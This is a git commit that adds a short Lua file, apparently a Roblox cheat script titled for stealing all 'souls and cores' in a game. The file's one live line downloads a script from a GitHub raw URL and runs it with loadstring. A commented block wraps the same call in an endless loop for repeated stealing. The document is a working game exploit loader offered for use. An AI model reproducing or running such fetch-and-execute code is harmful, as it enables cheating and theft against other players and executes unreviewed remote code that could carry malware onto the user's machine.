cbc7f6783cbb2a5f44f9c7547e734f71dbdfb4ea
Emil Toth <emiltoth1870@gmail.com>
2023-03-05 13:53:21 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Deviously Steal All Souls And Cores.lua
@@ -0,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/crazy-multivers-timlne-yes/main/the%20script%20bc%20yes", true))()
+
+--[[
+very deviously loop steal:
+getgenv().a = true
+while getgenv().a == true do
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/crazy-multivers-timlne-yes/main/the%20script%20bc%20yes", true))()
+     task.wait()
+end
+]]--
